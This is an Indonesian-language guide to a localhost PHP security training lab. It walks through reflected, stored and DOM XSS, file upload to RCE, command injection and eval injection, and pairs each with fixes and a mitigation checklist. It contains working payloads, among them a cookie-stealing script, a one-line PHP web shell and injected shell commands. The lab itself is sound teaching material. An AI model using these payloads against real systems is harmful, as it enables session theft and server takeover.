# Panduan Penggunaan Security Lab

Dokumen ini memandu Anda mengeksploitasi setiap kerentanan secara **sadar dan
terkendali** di lingkungan localhost. Tujuan: memahami mekanisme serangan agar
mampu membangun pertahanan.

> &#9888; Gunakan hanya di mesin Anda sendiri. Eksploitasi di sistem orang lain
> adalah ilegal.

---

## Poin Penting

- Semua halaman memiliki **perbandingan kode** (vulnerable vs patched) di bagian bawah.
- Gunakan tombol **Toggle Security** untuk berpindah mode.
- Semua payload yang dieksekusi tercatat di **Dashboard**.

---

## Langkah 1 - Setup

```bash
cd D:\OPENCODE\security-lab
C:\xampp\php\php.exe -S 127.0.0.1:8080 -t public
```

Akses `http://127.0.0.1:8080`.

---

## Langkah 2 - XSS Reflected

1. Buka `http://127.0.0.1:8080/xss/reflected.php`
2. Pastikan mode **Vulnerable**
3. Masukkan: `<script>alert('XSS')</script>` lalu cari

**Analisis:**

- Hasil pencarian menampilkan payload yang sama persis (tanpa encoding).
- Browser mengeksekusi `<script>`. Payload ini tidak bertahan di server (reflected).

**Payload lain:**

```html
<img src=x onerror=alert(document.cookie)>
```

---

## Langkah 3 - XSS Stored + Cookie Stealing

1. Buka `http://127.0.0.1:8080/xss/stored.php` (mode Vulnerable)
2. Kirim komentar:
   ```html
   <script>fetch('/steal-cookie.php?c='+document.cookie)</script>
   ```
3. Buka halaman komentar. Scheme menangkap cookie ke `logs/cookies.log`.
4. Lihat di **Dashboard > Cookie yang Ditangkap**.

**Mengapa berbahaya di dunia nyata?**

Cookie session yang dicuri bisa dipakai untuk impersonasi korban. Di lab ini,
endpoint stealer hanya mencatat ke file lokal.

---

## Langkah 4 - XSS DOM-Based

1. Buka (mode Vulnerable):
   ```
   http://127.0.0.1:8080/xss/dom.php#<img src=x onerror=alert(1)>
   ```
2. Perhatikan bahwa payload **tidak pernah dikirim ke server** &mdash; semua terjadi
   di DOM browser, sehingga melewati WAF server.

**Fix:** menggunakan `textContent` (lihat perbandingan kode).

---

## Langkah 5 - File Upload to RCE

1. Buat file `shell.php`:
   ```php
   <?php system($_GET['cmd']); ?>
   ```
2. Buka `http://127.0.0.1:8080/rce/upload.php` (mode Vulnerable)
3. Upload `shell.php`
4. Eksekusi: `http://127.0.0.1:8080/uploads/shell.php?cmd=whoami`

**Fix yang benar (mode Secure):**

- Allowlist ekstensi (jpg/png/gif) + verifikasi isi file (`getimagesize`)
- Simpan dengan nama ter-generate (mencegah path traversal)
- Serve folder uploads tanpa eksekusi eksekutabel (ada di aplikasi nyata)

---

## Langkah 6 - Command Injection

1. Buka `http://127.0.0.1:8080/rce/cmd.php` (mode Vulnerable)
2. Masukkan: `127.0.0.1; whoami` (Windows) atau `127.0.0.1; id` (Linux)
3. Dua perintah berjalan: ping + whoami/id

**Fix:**

```php
if (!filter_var($ip, FILTER_VALIDATE_IP)) die('invalid');
system('ping -c 1 ' . escapeshellarg($ip));
```

---

## Langkah 7 - Eval Injection

1. Buka `http://127.0.0.1:8080/rce/eval.php` (mode Vulnerable)
2. Masukkan: `2+2; system('whoami')`
3. `eval()` mengeksekusi seluruh string, termasuk perintah ekstra.

**Fix:** whitelist karakter matematika (regex) sebelum `eval`.

---

## Langkah 8 - Challenge Mode

Buka `http://127.0.0.1:8080/challenge.php`

| Level | Target | Cara |
|-------|--------|------|
| L1 | Eksekusi XSS reflected | kirim payload `<script>` di pencarian |
| L2 | Curi cookie | stored XSS + steal-cookie.php |
| L3 | Shell via upload | upload webshell `.php` |

Progress dihitung otomatis dari kondisi lab (payload log, cookies.log, file di uploads).

---

## Integrasi Burp Suite

1. Atur proxy browser ke Burp (127.0.0.1:8080).
2. Di halaman lab, lihat blok **Raw Request** (Dashboard) atau format terminal
   pada setiap halaman.
3. Klik **Copy Raw** untuk menempel langsung ke **Repeater**.
4. Modifikasi payload dan kirim.

---

## Reset Lab

Klik **Reset Lab** di header, atau buka `http://127.0.0.1:8080/reset-lab.php`.

Yang di-reset:

- Semua file di `public/uploads/`
- Tabel komentar &amp; log di SQLite
- `logs/cookies.log` &amp; `logs/activity.log`
- Session &amp; cookie pengunjung

---

## Checklist Mitigasi (untuk diskusi)

- [ ] Validasi &amp; sanitasi semua input (client dan server)
- [ ] Gunakan `htmlspecialchars()` pada output
- [ ] Parameterized queries (PDO prepared statements)
- [ ] Jangan pernah `eval()` input pengguna
- [ ] Jangan gabungkan input langsung ke system command; gunakan `escapeshellarg`
- [ ] Upload: allowlist ekstensi + verifikasi isi + nama acak + non-executable dir
- [ ] `HttpOnly` / `Secure` / `SameSite` pada cookie
- [ ] Content Security Policy (CSP)
- [ ] Update dependency &amp; patch rutin